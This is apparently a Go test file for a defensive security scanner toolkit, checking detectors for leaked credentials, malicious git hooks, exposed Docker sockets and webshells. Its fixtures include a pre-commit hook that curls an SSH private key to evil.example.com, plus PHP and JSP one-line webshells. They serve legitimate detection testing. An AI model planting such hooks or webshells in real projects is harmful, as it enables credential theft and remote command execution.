package code_test

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner"
	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner/code"
)

// ---------------------------------------------------------------------------
// Interface tests for all four scanners
// ---------------------------------------------------------------------------

func TestCredentialsScanner_Interface(t *testing.T) {
	s := code.NewCredentialsScanner()

	if s.Name() != "credentials" {
		t.Errorf("Name() = %q, want %q", s.Name(), "credentials")
	}
	if s.Category() != "code" {
		t.Errorf("Category() = %q, want %q", s.Category(), "code")
	}
	if s.RequiresRoot() {
		t.Error("RequiresRoot() should be false")
	}
	if !s.Available() {
		t.Error("Available() should be true")
	}
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}
	if s.RequiredTools() != nil {
		t.Error("RequiredTools() should be nil")
	}
	// OptionalTools now returns gitleaks and trufflehog.
	if len(s.OptionalTools()) == 0 {
		t.Error("OptionalTools() should advertise external tools")
	}

	// Verify it satisfies the scanner.Scanner interface at compile time.
	var _ scanner.Scanner = s
}

func TestSupplyChainScanner_Interface(t *testing.T) {
	s := code.NewSupplyChainScanner()

	if s.Name() != "supply_chain" {
		t.Errorf("Name() = %q, want %q", s.Name(), "supply_chain")
	}
	if s.Category() != "code" {
		t.Errorf("Category() = %q, want %q", s.Category(), "code")
	}
	if s.RequiresRoot() {
		t.Error("RequiresRoot() should be false")
	}
	if !s.Available() {
		t.Error("Available() should be true")
	}
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}

	var _ scanner.Scanner = s
}

func TestContainersScanner_Interface(t *testing.T) {
	s := code.NewContainersScanner()

	if s.Name() != "containers" {
		t.Errorf("Name() = %q, want %q", s.Name(), "containers")
	}
	if s.Category() != "code" {
		t.Errorf("Category() = %q, want %q", s.Category(), "code")
	}
	if s.RequiresRoot() {
		t.Error("RequiresRoot() should be false")
	}
	if !s.Available() {
		t.Error("Available() should be true")
	}
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}

	var _ scanner.Scanner = s
}

func TestGitHooksScanner_Interface(t *testing.T) {
	s := code.NewGitHooksScanner()

	if s.Name() != "git_hooks" {
		t.Errorf("Name() = %q, want %q", s.Name(), "git_hooks")
	}
	if s.Category() != "code" {
		t.Errorf("Category() = %q, want %q", s.Category(), "code")
	}
	if s.RequiresRoot() {
		t.Error("RequiresRoot() should be false")
	}
	if !s.Available() {
		t.Error("Available() should be true")
	}
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}

	var _ scanner.Scanner = s
}

// ---------------------------------------------------------------------------
// Stub scanners return no findings and no error
// ---------------------------------------------------------------------------

func TestSupplyChainScanner_Stub(t *testing.T) {
	s := code.NewSupplyChainScanner()
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan returned unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("expected 0 findings from stub, got %d", len(findings))
	}
}

func TestContainersScanner_Stub(t *testing.T) {
	s := code.NewContainersScanner()
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan returned unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("expected 0 findings from stub, got %d", len(findings))
	}
}

func TestGitHooksScanner_DoesNotError(t *testing.T) {
	s := code.NewGitHooksScanner()
	_, err := s.Scan(context.Background(), scanner.ScanOptions{TargetPaths: []string{t.TempDir()}})
	if err != nil {
		t.Fatalf("Scan returned unexpected error: %v", err)
	}
}

// TestGitHooksScanner_DetectsMaliciousHook creates a synthetic .git/hooks/
// directory containing a pre-commit hook with a curl command and verifies
// that the scanner returns a CRITICAL finding.
func TestGitHooksScanner_DetectsMaliciousHook(t *testing.T) {
	dir := t.TempDir()
	hooksDir := filepath.Join(dir, ".git", "hooks")
	if err := os.MkdirAll(hooksDir, 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}

	hookFile := filepath.Join(hooksDir, "pre-commit")
	content := "#!/bin/sh\ncurl http://evil.example.com/exfil -d @~/.ssh/id_rsa\n"
	if err := os.WriteFile(hookFile, []byte(content), 0o755); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	s := code.NewGitHooksScanner()
	opts := scanner.ScanOptions{TargetPaths: []string{dir}}
	findings, err := s.Scan(context.Background(), opts)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected at least one finding for malicious hook, got none")
	}
	found := false
	for _, f := range findings {
		if f.Severity == scanner.SevCritical && f.Scanner == "git_hooks" {
			found = true
			if f.ID == "" {
				t.Error("finding has empty ID")
			}
			if f.Evidence == "" {
				t.Error("finding has empty Evidence")
			}
			if f.Location == "" {
				t.Error("finding has empty Location")
			}
		}
	}
	if !found {
		t.Errorf("expected a CRITICAL finding for malicious hook, got: %+v", findings)
	}
}

// TestCredentialsScanner_CleanDirNoFindings verifies no credential findings in an empty dir.
func TestCredentialsScanner_CleanDirNoFindings(t *testing.T) {
	dir := t.TempDir()
	// Write a clean file with no credential patterns.
	if err := os.WriteFile(filepath.Join(dir, "readme.txt"), []byte("hello world\n"), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	s := code.NewCredentialsScanner()
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{TargetPaths: []string{dir}})
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("expected 0 findings in clean dir, got %d: %+v", len(findings), findings)
	}
}

// TestContainersScanner_NoDockerfilesNoFindings verifies no findings when no Dockerfiles present.
func TestContainersScanner_NoDockerfilesNoFindings(t *testing.T) {
	s := code.NewContainersScanner()
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{TargetPaths: []string{t.TempDir()}})
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("expected 0 findings with no Dockerfiles, got %d", len(findings))
	}
}

func TestGitHooksScanner_FlagsUnknownExecutableHook(t *testing.T) {
	dir := t.TempDir()
	hooksDir := filepath.Join(dir, ".git", "hooks")
	if err := os.MkdirAll(hooksDir, 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}

	hookFile := filepath.Join(hooksDir, "pre-push")
	content := "#!/bin/sh\necho 'running tests'\n"
	if err := os.WriteFile(hookFile, []byte(content), 0o755); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	s := code.NewGitHooksScanner()
	opts := scanner.ScanOptions{TargetPaths: []string{dir}}
	findings, err := s.Scan(context.Background(), opts)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}

	found := false
	for _, f := range findings {
		if f.Severity == scanner.SevMedium && f.Scanner == "git_hooks" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected a MEDIUM finding for unknown executable hook, got: %+v", findings)
	}
}

// TestGitHooksScanner_NoFindingsForHuskyHook verifies that a hook managed by
// husky does not produce findings.
func TestGitHooksScanner_NoFindingsForHuskyHook(t *testing.T) {
	dir := t.TempDir()
	hooksDir := filepath.Join(dir, ".git", "hooks")
	if err := os.MkdirAll(hooksDir, 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}

	hookFile := filepath.Join(hooksDir, "pre-commit")
	// Typical husky-generated hook content.
	content := "#!/bin/sh\n. \"$(dirname -- \"$0\")/_/husky.sh\"\nnpm test\n"
	if err := os.WriteFile(hookFile, []byte(content), 0o755); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	s := code.NewGitHooksScanner()
	opts := scanner.ScanOptions{TargetPaths: []string{dir}}
	findings, err := s.Scan(context.Background(), opts)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}

	for _, f := range findings {
		if f.Scanner == "git_hooks" {
			t.Errorf("unexpected finding for husky-managed hook: %+v", f)
		}
	}
}

// ---------------------------------------------------------------------------
// CredentialsScanner detection tests
// ---------------------------------------------------------------------------

// TestCredentialsScanner_DetectsAWSAccessKey verifies that a fake AWS access key
// (AKIA…) in a file is reported as a CRITICAL finding.
func TestCredentialsScanner_DetectsAWSAccessKey(t *testing.T) {
	dir := t.TempDir()
	envFile := filepath.Join(dir, ".env")

	content := "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n"
	if err := os.WriteFile(envFile, []byte(content), 0o600); err != nil {
		t.Fatalf("failed to write temp .env: %v", err)
	}

	s := code.NewCredentialsScanner()
	opts := scanner.ScanOptions{TargetPaths: []string{dir}}
	findings, err := s.Scan(context.Background(), opts)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}

	found := findingsByTitle(findings, "AWS access key exposed")
	if len(found) == 0 {
		t.Fatal("expected at least one finding for AWS access key, got none")
	}
	for _, f := range found {
		assertFindingFields(t, f)
		if f.Severity != scanner.SevCritical {
			t.Errorf("severity = %v, want CRITICAL", f.Severity)
		}
	}
}

// TestCredentialsScanner_DetectsAWSSecretKey verifies detection of an AWS secret
// access key assignment.
func TestCredentialsScanner_DetectsAWSSecretKey(t *testing.T) {
	dir := t.TempDir()
	credsFile := filepath.Join(dir, "credentials")

	content := "[default]\naws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n"
	if err := os.WriteFile(credsFile, []byte(content), 0o600); err != nil {
		t.Fatalf("failed to write temp credentials file: %v", err)
	}

	s := code.NewCredentialsScanner()
	opts := scanner.ScanOptions{TargetPaths: []string{dir}}
	findings, err := s.Scan(context.Background(), opts)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}

	found := findingsByTitle(findings, "AWS secret access key exposed")
	if len(found) == 0 {
		t.Fatal("expected at least one finding for AWS secret key, got none")
	}
	for _, f := range found {
		assertFindingFields(t, f)
		if f.Severity != scanner.SevCritical {
			t.Errorf("severity = %v, want CRITICAL", f.Severity)
		}
	}
}

// TestCredentialsScanner_DetectsPrivateKey verifies that a PEM private key header
// in a file produces a CRITICAL finding.
func TestCredentialsScanner_DetectsPrivateKey(t *testing.T) {
	dir := t.TempDir()
	keyFile := filepath.Join(dir, "id_rsa")

	content := "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----\n"
	if err := os.WriteFile(keyFile, []byte(content), 0o600); err != nil {
		t.Fatalf("failed to write temp key file: %v", err)
	}

	s := code.NewCredentialsScanner()
	opts := scanner.ScanOptions{TargetPaths: []string{dir}}
	findings, err := s.Scan(context.Background(), opts)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}

	found := findingsByTitle(findings, "Private key material exposed")
	if len(found) == 0 {
		t.Fatal("expected at least one finding for private key, got none")
	}
	for _, f := range found {
		assertFindingFields(t, f)
		if f.Severity != scanner.SevCritical {
			t.Errorf("severity = %v, want CRITICAL", f.Severity)
		}
	}
}

// TestCredentialsScanner_DetectsAPIKey verifies detection of a generic API key.
func TestCredentialsScanner_DetectsAPIKey(t *testing.T) {
	dir := t.TempDir()
	configFile := filepath.Join(dir, "config.yaml")

	content := "api_key: abcdef1234567890abcdef1234567890\n"
	if err := os.WriteFile(configFile, []byte(content), 0o600); err != nil {
		t.Fatalf("failed to write temp config file: %v", err)
	}

	s := code.NewCredentialsScanner()
	opts := scanner.ScanOptions{TargetPaths: []string{dir}}
	findings, err := s.Scan(context.Background(), opts)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}

	found := findingsByTitle(findings, "Generic API key or token exposed")
	if len(found) == 0 {
		t.Fatal("expected at least one finding for API key, got none")
	}
	for _, f := range found {
		assertFindingFields(t, f)
		if f.Severity != scanner.SevHigh {
			t.Errorf("severity = %v, want HIGH", f.Severity)
		}
	}
}

// TestCredentialsScanner_DetectsPassword verifies detection of a hardcoded password.
func TestCredentialsScanner_DetectsPassword(t *testing.T) {
	dir := t.TempDir()
	configFile := filepath.Join(dir, "app.conf")

	content := "database_password=supersecretpassword123\n"
	if err := os.WriteFile(configFile, []byte(content), 0o600); err != nil {
		t.Fatalf("failed to write temp config file: %v", err)
	}

	s := code.NewCredentialsScanner()
	opts := scanner.ScanOptions{TargetPaths: []string{dir}}
	findings, err := s.Scan(context.Background(), opts)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}

	found := findingsByTitle(findings, "Hardcoded password detected")
	if len(found) == 0 {
		t.Fatal("expected at least one finding for hardcoded password, got none")
	}
	for _, f := range found {
		assertFindingFields(t, f)
		if f.Severity != scanner.SevMedium {
			t.Errorf("severity = %v, want MEDIUM", f.Severity)
		}
	}
}

// TestCredentialsScanner_CleanFileProducesNoFindings verifies that a file with
// no credentials produces zero findings.
func TestCredentialsScanner_CleanFileProducesNoFindings(t *testing.T) {
	dir := t.TempDir()
	cleanFile := filepath.Join(dir, "readme.txt")

	content := "This is a clean file.\nNo secrets here.\nJust ordinary text.\n"
	if err := os.WriteFile(cleanFile, []byte(content), 0o644); err != nil {
		t.Fatalf("failed to write clean file: %v", err)
	}

	s := code.NewCredentialsScanner()
	opts := scanner.ScanOptions{TargetPaths: []string{dir}}
	findings, err := s.Scan(context.Background(), opts)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}

	if len(findings) != 0 {
		t.Errorf("expected 0 findings for clean file, got %d: %+v", len(findings), findings)
	}
}

// TestCredentialsScanner_FindingFields verifies that every finding from a
// secrets-laden file has all required fields populated.
func TestCredentialsScanner_FindingFields(t *testing.T) {
	dir := t.TempDir()
	secretsFile := filepath.Join(dir, "secrets.env")

	content := strings.Join([]string{
		"AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE",
		"aws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
		"-----BEGIN RSA PRIVATE KEY-----",
	}, "\n") + "\n"

	if err := os.WriteFile(secretsFile, []byte(content), 0o600); err != nil {
		t.Fatalf("failed to write secrets file: %v", err)
	}

	s := code.NewCredentialsScanner()
	opts := scanner.ScanOptions{TargetPaths: []string{dir}}
	findings, err := s.Scan(context.Background(), opts)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}

	if len(findings) == 0 {
		t.Fatal("expected findings but got none")
	}

	for _, f := range findings {
		assertFindingFields(t, f)
	}
}

// TestCredentialsScanner_SkipsBinaryFiles verifies that binary files (containing
// null bytes) are not scanned.
func TestCredentialsScanner_SkipsBinaryFiles(t *testing.T) {
	dir := t.TempDir()
	binaryFile := filepath.Join(dir, "binary.bin")

	// Create a file whose first 512 bytes include a null byte — looks like a binary.
	content := make([]byte, 600)
	copy(content, []byte("AKIAIOSFODNN7EXAMPLE"))
	content[100] = 0x00 // inject null byte to mark as binary

	if err := os.WriteFile(binaryFile, content, 0o644); err != nil {
		t.Fatalf("failed to write binary file: %v", err)
	}

	s := code.NewCredentialsScanner()
	opts := scanner.ScanOptions{TargetPaths: []string{dir}}
	findings, err := s.Scan(context.Background(), opts)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}

	if len(findings) != 0 {
		t.Errorf("expected 0 findings for binary file, got %d", len(findings))
	}
}

// TestCredentialsScanner_EvidenceTruncated verifies that very long lines are
// truncated to 200 characters in the Evidence field.
func TestCredentialsScanner_EvidenceTruncated(t *testing.T) {
	dir := t.TempDir()
	longFile := filepath.Join(dir, "long.env")

	// Build a line that is well over 200 chars and contains a pattern.
	padding := strings.Repeat("X", 300)
	content := "AKIAIOSFODNN7EXAMPLE" + padding + "\n"
	if err := os.WriteFile(longFile, []byte(content), 0o644); err != nil {
		t.Fatalf("failed to write long file: %v", err)
	}

	s := code.NewCredentialsScanner()
	opts := scanner.ScanOptions{TargetPaths: []string{dir}}
	findings, err := s.Scan(context.Background(), opts)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}

	for _, f := range findings {
		if len(f.Evidence) > 200 {
			t.Errorf("Evidence length %d exceeds 200 chars", len(f.Evidence))
		}
	}
}

// ---------------------------------------------------------------------------
// Git history scanning tests
// ---------------------------------------------------------------------------

// TestCredentialsScanner_GitHistory_DetectsDeletedAWSKey creates a temporary
// git repo, commits a file containing a fake AWS access key, deletes the file
// in a second commit, then verifies the scanner finds the secret in git history.
func TestCredentialsScanner_GitHistory_DetectsDeletedAWSKey(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available in PATH, skipping git history test")
	}

	dir := t.TempDir()

	// Configure a minimal git identity so commits work in CI.
	runGit := func(args ...string) {
		t.Helper()
		cmd := exec.Command("git", args...)
		cmd.Dir = dir
		out, err := cmd.CombinedOutput()
		if err != nil {
			t.Fatalf("git %v failed: %v\n%s", args, err, out)
		}
	}

	runGit("init", "-b", "main")
	runGit("config", "user.email", "test@example.com")
	runGit("config", "user.name", "Test User")

	// Commit a file containing a fake AWS access key.
	secretFile := filepath.Join(dir, "secrets.env")
	if err := os.WriteFile(secretFile, []byte("AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n"), 0o600); err != nil {
		t.Fatalf("failed to write secrets file: %v", err)
	}
	runGit("add", "-f", "secrets.env")
	runGit("commit", "-m", "add secrets")

	// Delete the file in a second commit.
	if err := os.Remove(secretFile); err != nil {
		t.Fatalf("failed to remove secrets file: %v", err)
	}
	runGit("rm", "secrets.env")
	runGit("commit", "-m", "remove secrets")

	// Run the credentials scanner against the temp repo.
	s := code.NewCredentialsScanner()
	opts := scanner.ScanOptions{TargetPaths: []string{dir}}
	findings, err := s.Scan(context.Background(), opts)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}

	// Look for a finding from git history with CRITICAL severity.
	var historyFindings []scanner.Finding
	for _, f := range findings {
		if strings.Contains(f.Location, "git history") {
			historyFindings = append(historyFindings, f)
		}
	}

	if len(historyFindings) == 0 {
		t.Fatalf("expected at least one git history finding, got none (all findings: %+v)", findings)
	}

	for _, f := range historyFindings {
		if f.Severity != scanner.SevCritical {
			t.Errorf("git history finding severity = %v, want CRITICAL", f.Severity)
		}
		if !strings.Contains(f.Location, "git history") {
			t.Errorf("Location %q does not contain 'git history'", f.Location)
		}
		if f.Scanner != "credentials" {
			t.Errorf("Scanner = %q, want 'credentials'", f.Scanner)
		}
		if f.Remediation == "" {
			t.Error("Remediation must not be empty")
		}
		assertFindingFields(t, f)
	}
}

// TestCredentialsScanner_GitHistory_NoFalsePositiveCleanRepo verifies that a
// clean repo with no secrets produces no git-history findings.
func TestCredentialsScanner_GitHistory_NoFalsePositiveCleanRepo(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available in PATH, skipping git history test")
	}

	dir := t.TempDir()

	runGit := func(args ...string) {
		t.Helper()
		cmd := exec.Command("git", args...)
		cmd.Dir = dir
		out, err := cmd.CombinedOutput()
		if err != nil {
			t.Fatalf("git %v failed: %v\n%s", args, err, out)
		}
	}

	runGit("init", "-b", "main")
	runGit("config", "user.email", "test@example.com")
	runGit("config", "user.name", "Test User")

	// Commit a clean file.
	cleanFile := filepath.Join(dir, "readme.txt")
	if err := os.WriteFile(cleanFile, []byte("Hello, world!\n"), 0o644); err != nil {
		t.Fatalf("failed to write clean file: %v", err)
	}
	runGit("add", "readme.txt")
	runGit("commit", "-m", "initial commit")

	s := code.NewCredentialsScanner()
	opts := scanner.ScanOptions{TargetPaths: []string{dir}}
	findings, err := s.Scan(context.Background(), opts)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}

	for _, f := range findings {
		if strings.Contains(f.Location, "git history") {
			t.Errorf("unexpected git history finding in clean repo: %+v", f)
		}
	}
}

// ---------------------------------------------------------------------------
// helpers
// ---------------------------------------------------------------------------

func findingsByTitle(findings []scanner.Finding, title string) []scanner.Finding {
	var out []scanner.Finding
	for _, f := range findings {
		if f.Title == title {
			out = append(out, f)
		}
	}
	return out
}

func assertFindingFields(t *testing.T, f scanner.Finding) {
	t.Helper()
	if f.ID == "" {
		t.Error("finding has empty ID")
	}
	if f.Scanner == "" {
		t.Error("finding has empty Scanner")
	}
	if f.Title == "" {
		t.Error("finding has empty Title")
	}
	if f.Evidence == "" {
		t.Error("finding has empty Evidence")
	}
	if f.Location == "" {
		t.Error("finding has empty Location")
	}
	if f.Remediation == "" {
		t.Error("finding has empty Remediation")
	}
}

// ---------------------------------------------------------------------------
// DockerRuntimeScanner — interface and detection tests
// ---------------------------------------------------------------------------

func TestDockerRuntimeScanner_Interface(t *testing.T) {
	s := code.NewDockerRuntimeScanner()

	if s.Name() != "docker_runtime" {
		t.Errorf("Name() = %q, want %q", s.Name(), "docker_runtime")
	}
	if s.Category() != "code" {
		t.Errorf("Category() = %q, want %q", s.Category(), "code")
	}
	if s.RequiresRoot() {
		t.Error("RequiresRoot() should be false")
	}
	if !s.Available() {
		t.Error("Available() should be true")
	}
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}

	var _ scanner.Scanner = s
}

func TestDockerRuntimeScanner_DoesNotPanic(t *testing.T) {
	s := code.NewDockerRuntimeScanner()
	_, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan returned unexpected error: %v", err)
	}
}

// TestDockerRuntimeScanner_DetectsWorldReadableSocket creates a temp file
// with world-readable permissions to simulate an exposed Docker socket and
// verifies a CRITICAL finding is produced.
func TestDockerRuntimeScanner_DetectsWorldReadableSocket(t *testing.T) {
	dir := t.TempDir()
	socketPath := filepath.Join(dir, "docker.sock")
	if err := os.WriteFile(socketPath, []byte{}, 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	s := code.NewDockerRuntimeScannerWithSocket(socketPath)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}

	found := false
	for _, f := range findings {
		if f.Severity == scanner.SevCritical && f.Scanner == "docker_runtime" {
			found = true
			if f.ID == "" {
				t.Error("finding has empty ID")
			}
			if f.Evidence == "" {
				t.Error("finding has empty Evidence")
			}
		}
	}
	if !found {
		t.Errorf("expected CRITICAL finding for world-readable Docker socket, got: %+v", findings)
	}
}

// TestDockerRuntimeScanner_NoFindingForRestrictedSocket verifies that a socket
// with owner-only permissions (0o600) produces no socket-permission finding.
func TestDockerRuntimeScanner_NoFindingForRestrictedSocket(t *testing.T) {
	dir := t.TempDir()
	socketPath := filepath.Join(dir, "docker.sock")
	if err := os.WriteFile(socketPath, []byte{}, 0o600); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	s := code.NewDockerRuntimeScannerWithSocket(socketPath)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}
	for _, f := range findings {
		if strings.Contains(f.Title, "world") {
			t.Errorf("unexpected socket permission finding for restricted socket: %+v", f)
		}
	}
}

// TestDockerRuntimeScanner_NoFindingWhenSocketAbsent verifies that when the
// Docker socket does not exist the scanner returns no findings and no error.
func TestDockerRuntimeScanner_NoFindingWhenSocketAbsent(t *testing.T) {
	dir := t.TempDir()
	s := code.NewDockerRuntimeScannerWithSocket(filepath.Join(dir, "nonexistent.sock"))
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("expected 0 findings when socket absent, got %d: %+v", len(findings), findings)
	}
}

// ---------------------------------------------------------------------------
// WebshellScanner — interface and detection tests
// ---------------------------------------------------------------------------

func TestWebshellScanner_Interface(t *testing.T) {
	s := code.NewWebshellScanner()

	if s.Name() != "webshell" {
		t.Errorf("Name() = %q, want %q", s.Name(), "webshell")
	}
	if s.Category() != "code" {
		t.Errorf("Category() = %q, want %q", s.Category(), "code")
	}
	if s.RequiresRoot() {
		t.Error("RequiresRoot() should be false")
	}
	if !s.Available() {
		t.Error("Available() should be true")
	}
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}
	if s.RequiredTools() != nil {
		t.Error("RequiredTools() should be nil")
	}

	var _ scanner.Scanner = s
}

// TestWebshellScanner_DetectsPHPEval creates a synthetic PHP file containing
// eval() and verifies a HIGH (or CRITICAL if recent) finding is produced.
func TestWebshellScanner_DetectsPHPEval(t *testing.T) {
	dir := t.TempDir()
	phpFile := filepath.Join(dir, "shell.php")
	content := "<?php eval($_GET['cmd']); ?>\n"
	if err := os.WriteFile(phpFile, []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	s := code.NewWebshellScanner()
	opts := scanner.ScanOptions{TargetPaths: []string{dir}}
	findings, err := s.Scan(context.Background(), opts)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}

	found := false
	for _, f := range findings {
		if f.Scanner == "webshell" && strings.Contains(f.Title, "eval") {
			found = true
			if f.ID == "" {
				t.Error("finding has empty ID")
			}
			if f.Evidence == "" {
				t.Error("finding has empty Evidence")
			}
			if f.Location == "" {
				t.Error("finding has empty Location")
			}
			if f.Remediation == "" {
				t.Error("finding has empty Remediation")
			}
			if f.Severity < scanner.SevHigh {
				t.Errorf("expected severity >= HIGH, got %s", f.Severity)
			}
		}
	}
	if !found {
		t.Errorf("expected webshell finding for eval(), got: %+v", findings)
	}
}

// TestWebshellScanner_DetectsJSPRuntimeExec creates a synthetic JSP file
// containing Runtime.getRuntime().exec() and verifies a HIGH finding is produced.
func TestWebshellScanner_DetectsJSPRuntimeExec(t *testing.T) {
	dir := t.TempDir()
	jspFile := filepath.Join(dir, "cmd.jsp")
	content := `<%@ page import="java.io.*" %>
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
`
	if err := os.WriteFile(jspFile, []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	s := code.NewWebshellScanner()
	opts := scanner.ScanOptions{TargetPaths: []string{dir}}
	findings, err := s.Scan(context.Background(), opts)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}

	found := false
	for _, f := range findings {
		if f.Scanner == "webshell" && strings.Contains(f.Title, "Runtime.exec") {
			found = true
			if f.Severity < scanner.SevHigh {
				t.Errorf("expected severity >= HIGH, got %s", f.Severity)
			}
		}
	}
	if !found {
		t.Errorf("expected webshell finding for JSP Runtime.exec(), got: %+v", findings)
	}
}

// TestWebshellScanner_SkipsNonWebExtensions verifies that files with
// non-web extensions (e.g. .go, .txt) are not flagged even if they
// contain webshell-like content.
func TestWebshellScanner_SkipsNonWebExtensions(t *testing.T) {
	dir := t.TempDir()
	goFile := filepath.Join(dir, "main.go")
	content := "// eval( system( exec(\npackage main\n"
	if err := os.WriteFile(goFile, []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	s := code.NewWebshellScanner()
	opts := scanner.ScanOptions{TargetPaths: []string{dir}}
	findings, err := s.Scan(context.Background(), opts)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}
	for _, f := range findings {
		if f.Scanner == "webshell" {
			t.Errorf("unexpected webshell finding for .go file: %+v", f)
		}
	}
}

// TestWebshellScanner_CleanPHPNoFindings verifies that a clean PHP file
// with no webshell indicators produces no findings.
func TestWebshellScanner_CleanPHPNoFindings(t *testing.T) {
	dir := t.TempDir()
	phpFile := filepath.Join(dir, "index.php")
	content := "<?php\necho 'Hello, World!';\n?>\n"
	if err := os.WriteFile(phpFile, []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	s := code.NewWebshellScanner()
	opts := scanner.ScanOptions{TargetPaths: []string{dir}}
	findings, err := s.Scan(context.Background(), opts)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}
	for _, f := range findings {
		if f.Scanner == "webshell" {
			t.Errorf("unexpected webshell finding for clean PHP file: %+v", f)
		}
	}
}

// TestWebshellScanner_SkipsLargeFiles verifies that files larger than 1 MB
// are not scanned (to match the maxFileSize constraint).
func TestWebshellScanner_SkipsLargeFiles(t *testing.T) {
	dir := t.TempDir()
	phpFile := filepath.Join(dir, "large.php")
	// Write 1 MB + 1 byte of content that would trigger a finding if scanned.
	data := make([]byte, 1*1024*1024+1)
	copy(data, []byte("<?php eval($_GET['cmd']); ?>"))
	if err := os.WriteFile(phpFile, data, 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	s := code.NewWebshellScanner()
	opts := scanner.ScanOptions{TargetPaths: []string{dir}}
	findings, err := s.Scan(context.Background(), opts)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}
	for _, f := range findings {
		if f.Scanner == "webshell" {
			t.Errorf("unexpected webshell finding for large file: %+v", f)
		}
	}
}

// ---------------------------------------------------------------------------
// mockToolRunner — used by supply-chain, containers, and git-hooks tests
// ---------------------------------------------------------------------------

type mockToolRunner struct {
	available map[string]bool
	outputs   map[string][]byte
}

func (m *mockToolRunner) Available(tool string) bool {
	return m.available[tool]
}

func (m *mockToolRunner) Run(_ context.Context, tool string, _ []string) ([]byte, error) {
	if out, ok := m.outputs[tool]; ok {
		return out, nil
	}
	return nil, nil
}

// ---------------------------------------------------------------------------
// SupplyChainScanner — functional tests with mock ToolRunner
// ---------------------------------------------------------------------------

func TestSupplyChainScanner_NoToolRunnerReturnsNil(t *testing.T) {
	s := code.NewSupplyChainScanner()
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if findings != nil {
		t.Errorf("expected nil findings without ToolRunner, got %v", findings)
	}
}

func TestSupplyChainScanner_TrivyNotAvailableReturnsNil(t *testing.T) {
	s := code.NewSupplyChainScanner()
	tr := &mockToolRunner{available: map[string]bool{"trivy": false}}
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{ToolRunner: tr})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if findings != nil {
		t.Errorf("expected nil findings when trivy unavailable, got %v", findings)
	}
}

